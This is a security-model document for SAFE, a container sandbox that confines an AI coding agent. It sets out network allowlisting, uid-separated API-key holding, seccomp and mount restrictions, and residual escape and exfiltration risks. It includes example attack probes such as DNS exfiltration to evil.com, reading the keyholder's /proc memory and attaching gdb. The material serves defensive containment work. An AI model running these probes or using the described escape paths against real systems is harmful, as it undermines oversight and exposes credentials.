# SAFE Security Model

This document is the short version of [the design doc](plans/2026-05-15-safe-design.md) — what SAFE defends against, how, and what it deliberately does not protect.

## What we're trying to stop

An attacker who controls the agent's behaviour — through a prompt injection, a malicious skill, a compromised model — should not be able to:

1. **Exfiltrate the LLM API key.**
2. **Exfiltrate host secrets** (SSH keys, AWS creds, GitHub tokens, etc.).
3. **Reach arbitrary internet hosts** from inside the sandbox.
4. **Persist payloads** to your real disk outside the workspace.
5. **Escalate inside the container** (gain capabilities, escape to host).

## Defences

### Network — default-deny + DNS-anchored allowlist

- `nftables OUTPUT` policy is `DROP`. Loopback is allowed, established/related is allowed, plus exactly three classes of new outbound connection:
  - UDP/53 to `127.0.0.1` (anyone may talk to the in-container resolver).
  - UDP/53 to the configured upstream resolvers — restricted to **uid 200** (the `firewall` user that runs safe-dns).
  - Any traffic to an IP that's in the dynamic `allowed_v4` / `allowed_v6` set, populated by safe-dns when an allowlisted FQDN is resolved. Entries expire at the DNS TTL (clamped between 30s and 1h).
- A raw IP connection from the agent (`curl https://1.2.3.4`) has no rule to match and is dropped at the kernel.
- DNS exfil to a public resolver (`dig @8.8.8.8 evil.com`) is dropped because the upstream-DNS rule is uid-scoped to `firewall`.

### LLM API key — uid-separated keyholder

- `safe-keyholder` runs as uid 201. It reads the real API key from stdin once at startup; the host pipes it through a Unix socket and then closes.
- The agent runs as uid 1000 with `ANTHROPIC_BASE_URL=http://127.0.0.1:8443` and `ANTHROPIC_API_KEY=dummy`. Every outbound request flows through keyholder, which strips any `Authorization`/`x-api-key` header and replaces it with the real one.
- The agent cannot read the key because:
  - `/proc` is mounted with `hidepid=2` so non-firewall uids cannot list other users' processes.
  - `ptrace`, `process_vm_readv`, `process_vm_writev` are blocked by seccomp.
  - The key never appears in the agent's environment.

### Host secrets — mount nothing by default

- The host bind-mount is exactly `$PWD:/workspace`. **Nothing else** from the host filesystem is mounted unless explicitly opted in via `safe.yaml`.
- Hardcoded denylist of items that **cannot** be mounted regardless of config: `.credentials.json`, `projects/`, `.claude.json`, anything under `.git/` inside `.claude/`.
- No `SSH_AUTH_SOCK` forwarding. No `/var/run/docker.sock`. No `~/.ssh`, `~/.aws`, `~/.config/gh`.
- Host environment is **not** passed through — only an explicit allowlist (`TERM`, `LANG`, `TZ` by default).

### Container hardening

- `--cap-drop ALL` plus a deliberately small **required** capability set:
  - `NET_ADMIN` — safe-dns manages nftables sets at runtime.
  - `SETUID` / `SETGID` — `safe-init` (PID 1, root) spawns workers as uids 200/201/1000 via `setresuid`/`setresgid`. Without these the architecture can't function (Linux drops these from the bounding set under `--cap-drop ALL`).
  - `KILL` — `safe-init` signals cross-uid children in `supervise` at shutdown.
- An **opt-in** `extra_caps` field in `safe.yaml` may add capabilities from a small allowlist: `SYS_ADMIN` (enables `/proc hidepid=2`), `SYS_PTRACE` (cross-uid debugger attach; diagnostic only), `NET_BIND_SERVICE` (privileged ports). Anything outside that allowlist requires source-editing; this prevents a misconfigured config from silently widening the bounding set to e.g. `DAC_OVERRIDE`.
- File capability `cap_net_admin+ep` on `safe-dns`, locked to mode `0750` owned by `root:firewall`. Only `firewall` and `root` (i.e. `safe-init`) can execute it; the agent uid cannot exec it and therefore cannot harvest the file cap. `safe-dns` raises the cap into its **ambient** set at startup so the `nft` processes it forks inherit it.
- **Note:** we deliberately do **not** pass `--security-opt no-new-privileges`. The kernel ignores file capabilities entirely under `no_new_privs`, which would break the `cap_net_admin` mechanism above. The protection `no-new-privs` would have given (preventing privilege gain via setuid/file-caps on exec) is achieved more narrowly via the `0750` permission on `safe-dns`, the absence of any setuid binaries in the image, and seccomp's denial of `ptrace`/`process_vm_*`.
- `--security-opt seccomp=image/seccomp.json` — explicit allowlist syscall filter on top of Docker's default. Explicit denies: `ptrace`, `bpf`, `mount`, `umount`, `umount2`, `pivot_root`, `userfaultfd`, `kexec_load`, `init_module`, `delete_module`, `process_vm_readv`, `process_vm_writev`.
- `--read-only` rootfs. Writes only through tmpfs (`/tmp`, `/run`, `/home/agent`) or named volumes.
- `--pids-limit 256`, `--memory 4g` to bound fork-bomb / memory-pressure damage.

#### Threat model note on the required cap set

`SETUID` / `SETGID` / `KILL` are inside the container's bounding set for as long as the container is alive. An attacker who escapes to **in-container root** would therefore be able to `setresuid` to any uid and signal any process. In practice:

- Escape from the agent uid (1000) to in-container root is not a one-step move: it requires either kernel-level privilege escalation (out of SAFE's scope; mitigated by seccomp + `--read-only` + minimal cap set) or a setuid binary in the image (none exist; hardening pass at build time removes them).
- Once in-container root, an attacker who can `setresuid 201` can attach to the keyholder process and read the secret from memory — BUT this requires both (a) container-root escape AND (b) the seccomp `ptrace` / `process_vm_*` denial to be bypassed. Both happening simultaneously is already the "kernel zero-day" failure mode acknowledged in the residual-risk section.
- Without `SYS_ADMIN` enabled via `extra_caps`, `/proc hidepid=2` is best-effort and the agent uid can list other uids' PIDs. The kernel still blocks `/proc/<keyholder>/{mem,environ,maps}` via uid checks regardless of hidepid, so the secret stays out of reach — information disclosure only.

**Recommendation:** for production use, set `extra_caps: [SYS_ADMIN]` in `safe.yaml`. This enables `hidepid=2`, hardening the in-container side of the keyholder isolation.

### Escalation

- No setuid/setgid binaries in the image (hardening pass at build time).
- No `sudo`, no `su`, no `sudoers` file.
- Three uid-separated principals: `firewall` (200), `keyholder` (201), `agent` (1000). None can become root.

## What SAFE does **not** protect against

These are stated up front so users aren't surprised.

- **User-introduced secrets.** If you paste a credential into the agent's prompt, it ends up in the LLM payload and is sent through keyholder to Anthropic. SAFE cannot stop you from handing the agent a key.
- **Side-channel exfil via the LLM provider.** The agent has a legitimate, allowlisted path to `api.anthropic.com`. A malicious model could in principle encode data into a request body. We accept this — the LLM provider is in your trust boundary by definition.
- **Docker daemon compromise.** SAFE assumes the host Docker daemon is honest. If `docker` itself is compromised, none of the hardening above helps.
- **Kernel zero-days.** Seccomp + cap-drop reduce the attack surface but cannot make the kernel safe against unknown vulnerabilities. eBPF-level enforcement (Argus) is a complementary defence here.
- **Workspace damage.** Anything in `$PWD` is fair game for the agent. That's the entire point — the agent is supposed to edit your code. Use git to recover from anything you don't like; SAFE does not give you a `--review-before-write` gate.
- **Information disclosure inside the conversation.** SAFE does not redact outbound LLM requests. If you want that, run [RAGE](https://sbp.gitlab.schubergphilis.com/sbp-ai/rage) in front of keyholder.

## Residual risk summary

| Risk | Mitigation |
|---|---|
| Agent reads/leaks API key | uid separation + ptrace/process_vm seccomp denial + hidepid=2 |
| Agent connects to attacker-controlled host | nftables default-drop + FQDN allowlist + no raw-IP allowance |
| Agent reads SSH/AWS/etc. host secrets | Default-empty bind mounts + env-var allowlist + denylisted paths |
| Agent persists payloads | Read-only rootfs + tmpfs-only writes outside `/workspace` |
| Agent escalates to root inside container | No setuid binaries + no sudo + minimal bounding set + seccomp denies `ptrace`/`process_vm_*` + agent uid 1000 has zero effective caps. Bounding set includes SETUID/SETGID/KILL (required for the architecture); container-root escape is still required before those become reachable. |
| Agent escapes to host | --cap-drop ALL + custom seccomp + no docker.sock mount |
| User pastes credential at prompt | Not mitigated — accepted risk |
| LLM provider is malicious | Not mitigated — trust boundary by definition |

## How to verify

Manual smoke tests once the image builds:

```bash
safe --shell
# Inside:
curl -fsS https://api.anthropic.com/v1/messages   # 4xx from upstream (auth) — path works
host evil.com                                     # NXDOMAIN
curl -m 3 https://1.1.1.1                         # times out (no nft rule)
echo "$ANTHROPIC_API_KEY"                         # empty / dummy
find / -perm /4000 -type f 2>/dev/null            # empty
getcap /usr/sbin/safe-dns                         # cap_net_admin+ep
gdb -p $(pgrep -u keyholder safe-keyholder)       # permission denied
cat /proc/$(pgrep -u keyholder safe-keyholder)/mem  # permission denied (uid check; works even without hidepid)
docker inspect --format '{{.HostConfig.CapAdd}}' safe-<runid>  # [NET_ADMIN SETUID SETGID KILL ...]
```

A formal CI integration test that asserts each of these will land in M8 of the implementation plan.
